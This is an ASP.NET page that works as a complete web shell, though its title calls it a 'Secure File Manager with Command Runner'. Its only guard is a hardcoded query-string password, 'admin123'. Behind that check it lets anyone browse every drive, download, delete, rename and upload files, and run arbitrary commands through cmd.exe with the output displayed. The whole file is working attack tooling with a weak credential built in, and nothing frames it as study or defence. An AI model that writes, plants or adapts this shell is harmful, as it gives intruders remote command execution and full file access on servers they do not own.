<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <h2>Secure File Manager with Command Runner</h2>

        <asp:Label ID="lblTabs" runat="server"></asp:Label>
        <hr />

        <asp:Panel ID="pnlFileManager" runat="server" Visible="true">

            <asp:Label ID="lblPath" runat="server" Font-Bold="true"></asp:Label><br />

            <asp:Button ID="btnGoBack" runat="server" Text="Go Back" OnClick="btnGoBack_Click" /><br /><br />

            <asp:GridView ID="gv" runat="server" AutoGenerateColumns="False" OnRowCommand="gv_RowCommand">
                <Columns>
                    <asp:BoundField DataField="Name" HeaderText="Name" />
                    <asp:ButtonField CommandName="Open" Text="Open/Download" />
                    <asp:ButtonField CommandName="Delete" Text="Delete" />
                    <asp:ButtonField CommandName="Rename" Text="Rename" />
                </Columns>
            </asp:GridView>

            <br />

            <asp:TextBox ID="txtNewFolder" runat="server" placeholder="New Folder Name"></asp:TextBox>
            <asp:Button ID="btnCreateFolder" runat="server" Text="Create Folder" OnClick="btnCreateFolder_Click" />

            <br /><br />

            <asp:FileUpload ID="fileUpload" runat="server" />
            <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />

            <br /><br />

            <asp:Panel ID="pnlRename" runat="server" Visible="false">
                <asp:TextBox ID="txtRename" runat="server"></asp:TextBox>
                <asp:Button ID="btnRenameOk" runat="server" Text="OK" OnClick="btnRenameOk_Click" />
                <asp:Button ID="btnRenameCancel" runat="server" Text="Cancel" OnClick="btnRenameCancel_Click" />
            </asp:Panel>

        </asp:Panel>

        <asp:Panel ID="pnlCmdRunner" runat="server" Visible="false" style="margin-top:20px;">
            <asp:Label ID="lblCmd" runat="server" Text="Enter Command:" AssociatedControlID="txtCommand"></asp:Label><br />
            <asp:TextBox ID="txtCommand" runat="server" Width="600px"></asp:TextBox>
            <asp:Button ID="btnRunCmd" runat="server" Text="Run" OnClick="btnRunCmd_Click" />
            <br /><br />
            <asp:TextBox ID="txtCmdOutput" runat="server" TextMode="MultiLine" Rows="20" Columns="80" ReadOnly="true" Style="font-family: Consolas, monospace;"></asp:TextBox>
        </asp:Panel>

        <script runat="server">
            string password = "admin123";

            protected void Page_Load(object sender, EventArgs e)
            {
                if (Request.QueryString["auth"] != password)
                {
                    Response.Write("<h2>Access Denied</h2>");
                    Response.End();
                }

                if (!IsPostBack)
                {
                    string tab = Request.QueryString["tab"];
                    if (string.IsNullOrEmpty(tab)) tab = "filemanager";
                    ViewState["Tab"] = tab;

                    string path = Request.QueryString["path"];
                    if (string.IsNullOrEmpty(path))
                        ViewState["CurrentPath"] = null;
                    else
                        ViewState["CurrentPath"] = path;

                    BindUI();
                }
            }

            void BindUI()
            {
                string tab = (string)ViewState["Tab"];
                pnlFileManager.Visible = (tab == "filemanager");
                pnlCmdRunner.Visible = (tab == "cmdrunner");

                // Tabs UI
                string auth = HttpUtility.UrlEncode(password);
                string fmTabStyle = (tab == "filemanager") ? "font-weight:bold;" : "";
                string cmdTabStyle = (tab == "cmdrunner") ? "font-weight:bold;" : "";

                lblTabs.Text = $@"<a href='?auth={auth}&tab=filemanager' style='margin-right:20px; {fmTabStyle}'>File Manager</a>
                                  <a href='?auth={auth}&tab=cmdrunner' style='{cmdTabStyle}'>Command Runner</a>";

                if (tab == "filemanager")
                    BindGrid();
            }

            void BindGrid()
            {
                var currentPath = (string)ViewState["CurrentPath"];
                if (string.IsNullOrEmpty(currentPath))
                {
                    var drives = DriveInfo.GetDrives();
                    gv.DataSource = drives;
                    gv.DataBind();
                    lblPath.Text = "Drives:";
                }
                else
                {
                    lblPath.Text = "Path: " + currentPath;

                    var items = new System.Collections.Generic.List<dynamic>();

                    foreach (var dir in Directory.GetDirectories(currentPath))
                        items.Add(new { Name = "[DIR] " + Path.GetFileName(dir), Path = dir, IsDir = true });

                    foreach (var file in Directory.GetFiles(currentPath))
                        items.Add(new { Name = Path.GetFileName(file), Path = file, IsDir = false });

                    gv.DataSource = items;
                    gv.DataBind();
                }
            }

            protected void gv_RowCommand(object sender, System.Web.UI.WebControls.GridViewCommandEventArgs e)
            {
                int index = Convert.ToInt32(e.CommandArgument);
                var currentPath = (string)ViewState["CurrentPath"];

                if (string.IsNullOrEmpty(currentPath))
                {
                    var drives = DriveInfo.GetDrives();
                    var drive = drives[index].Name;
                    Response.Redirect($"?auth={password}&tab=filemanager&path={HttpUtility.UrlEncode(drive)}");
                }
                else
                {
                    var items = new System.Collections.Generic.List<dynamic>();

                    foreach (var dir in Directory.GetDirectories(currentPath))
                        items.Add(new { Name = "[DIR] " + Path.GetFileName(dir), Path = dir, IsDir = true });

                    foreach (var file in Directory.GetFiles(currentPath))
                        items.Add(new { Name = Path.GetFileName(file), Path = file, IsDir = false });

                    var item = items[index];

                    if (e.CommandName == "Open")
                    {
                        if (item.IsDir)
                        {
                            Response.Redirect($"?auth={password}&tab=filemanager&path={HttpUtility.UrlEncode(item.Path)}");
                        }
                        else
                        {
                            Response.ContentType = "application/octet-stream";
                            Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(item.Path));
                            Response.TransmitFile(item.Path);
                            Response.End();
                        }
                    }
                    else if (e.CommandName == "Delete")
                    {
                        if (item.IsDir)
                            Directory.Delete(item.Path, true);
                        else
                            File.Delete(item.Path);
                        BindGrid();
                    }
                    else if (e.CommandName == "Rename")
                    {
                        ViewState["RenameIndex"] = index;
                        txtRename.Text = item.Name.Replace("[DIR] ", "");
                        pnlRename.Visible = true;
                    }
                }
            }

            protected void btnGoBack_Click(object sender, EventArgs e)
            {
                var currentPath = (string)ViewState["CurrentPath"];
                if (string.IsNullOrEmpty(currentPath))
                    return;

                var parent = Directory.GetParent(currentPath);
                if (parent == null)
                    Response.Redirect($"?auth={password}&tab=filemanager");
                else
                    Response.Redirect($"?auth={password}&tab=filemanager&path={HttpUtility.UrlEncode(parent.FullName)}");
            }

            protected void btnCreateFolder_Click(object sender, EventArgs e)
            {
                var currentPath = (string)ViewState["CurrentPath"];
                if (!string.IsNullOrEmpty(currentPath) && !string.IsNullOrWhiteSpace(txtNewFolder.Text))
                {
                    var newFolder = Path.Combine(currentPath, txtNewFolder.Text.Trim());
                    if (!Directory.Exists(newFolder))
                    {
                        Directory.CreateDirectory(newFolder);
                    }
                    txtNewFolder.Text = "";
                    BindGrid();
                }
            }

            protected void btnUpload_Click(object sender, EventArgs e)
            {
                var currentPath = (string)ViewState["CurrentPath"];
                if (fileUpload.HasFile && !string.IsNullOrEmpty(currentPath))
                {
                    var savePath = Path.Combine(currentPath, Path.GetFileName(fileUpload.FileName));
                    fileUpload.SaveAs(savePath);
                    BindGrid();
                }
            }

            protected void btnRenameOk_Click(object sender, EventArgs e)
            {
                var currentPath = (string)ViewState["CurrentPath"];
                if (ViewState["RenameIndex"] != null && !string.IsNullOrEmpty(currentPath))
                {
                    int index = (int)ViewState["RenameIndex"];

                    var items = new System.Collections.Generic.List<dynamic>();

                    foreach (var dir in Directory.GetDirectories(currentPath))
                        items.Add(new { Name = "[DIR] " + Path.GetFileName(dir), Path = dir, IsDir = true });

                    foreach (var file in Directory.GetFiles(currentPath))
                        items.Add(new { Name = Path.GetFileName(file), Path = file, IsDir = false });

                    var item = items[index];

                    var newName = txtRename.Text.Trim();
                    if (!string.IsNullOrEmpty(newName))
                    {
                        string newPath = Path.Combine(currentPath, newName);
                        if (item.IsDir)
                            Directory.Move(item.Path, newPath);
                        else
                            File.Move(item.Path, newPath);
                    }
                    pnlRename.Visible = false;
                    BindGrid();
                }
            }

            protected void btnRenameCancel_Click(object sender, EventArgs e)
            {
                pnlRename.Visible = false;
            }

            protected void btnRunCmd_Click(object sender, EventArgs e)
            {
                string command = txtCommand.Text.Trim();
                if (!string.IsNullOrEmpty(command))
                {
                    try
                    {
                        var process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + command;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();

                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();

                        process.WaitForExit();

                        txtCmdOutput.Text = output + (string.IsNullOrEmpty(error) ? "" : ("\nERROR:\n" + error));
                    }
                    catch (Exception ex)
                    {
                        txtCmdOutput.Text = "Error: " + ex.Message;
                    }
                }
            }
        </script>
    </form>
</body>
</html>
